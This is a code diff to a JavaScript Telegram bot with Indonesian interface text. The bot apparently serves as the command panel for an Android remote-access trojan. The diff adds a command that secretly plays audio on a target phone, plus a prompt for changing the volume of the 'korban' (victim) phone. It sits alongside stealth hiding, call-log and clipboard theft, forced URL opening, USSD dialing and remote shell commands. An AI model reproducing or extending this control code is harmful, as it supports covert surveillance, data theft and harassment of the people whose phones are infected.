@@ -100,7 +100,8 @@ const commandsWithArgs = {
     'open_url': 'Masukkan URL yang ingin dibuka secara paksa:',
     'set_wallpaper': 'Masukkan URL Gambar untuk Wallpaper baru:',
     'dial_number': 'Masukkan Nomor/USSD (cth: *123#):',
-    'shell': 'Masukkan perintah Shell/Terminal:'
+    'shell': 'Masukkan perintah Shell/Terminal:',
+    'play_sound': 'Masukkan direct URL tautan file mp3 yang ingin diputar diam-diam:'
 };
 
 // --- RENDER PAGINATION FILE EXPLORER ---
@@ -290,7 +291,8 @@ Harus diketik dengan format:
                 [Markup.button.callback('☎️ Call Log', `runcmd:${devId}:get_call_logs`), Markup.button.callback('📲 Dial Number', `runcmd:${devId}:dial_number`)],
                 [Markup.button.callback('👻 Hide (Stealth)', `runcmd:${devId}:hide_app`), Markup.button.callback('📻 Info Volume', `runcmd:${devId}:get_volume`)],
                 [Markup.button.callback('📦 Daftar App', `runcmd:${devId}:get_installed_apps`), Markup.button.callback('ℹ️ Info Sistem', `runcmd:${devId}:get_device_info`)],
-                [Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`), Markup.button.callback('📋 Clipboard', `runcmd:${devId}:clipboard`)]
+                [Markup.button.callback('🎵 Play Sound', `runcmd:${devId}:play_sound`), Markup.button.callback('⚙️ Sensor', `runcmd:${devId}:sensors`)],
+                [Markup.button.callback('📋 Clipboard', `runcmd:${devId}:clipboard`)]
             );
         }
 
@@ -332,6 +334,12 @@ Harus diketik dengan format:
         if (commandsWithArgs[cmdName] && !cmdText) {
             activeInput[ctx.chat.id] = { devId, command: cmdName };
             return ctx.reply(`⌨️ <b>Input Diperlukan:</b>\n${commandsWithArgs[cmdName]}`, { parse_mode: 'HTML' });
+        }
+
+        // Khusus info volume: tampilkan status dulu, tapi juga siapkan form standby untuk set_volume jika pengguna reply
+        if (cmdName === 'get_volume') {
+            activeInput[ctx.chat.id] = { devId, command: 'set_volume' };
+            ctx.reply(`💡 Untuk **mengubah** volume HP korban, balas pesan ini dengan format <code>[tipe] [angka]</code>\nContoh: \n<code>music 5</code>\n<code>ring 7</code>\n<code>alarm 10</code>\n<code>notification 5</code>\n\n*(Abaikan jika Anda cuma mau melihat info)*`, { parse_mode: 'HTML' }).catch(() => { });
         }
 
         // Dekode shortId jika menggunakan Mapping Path ID
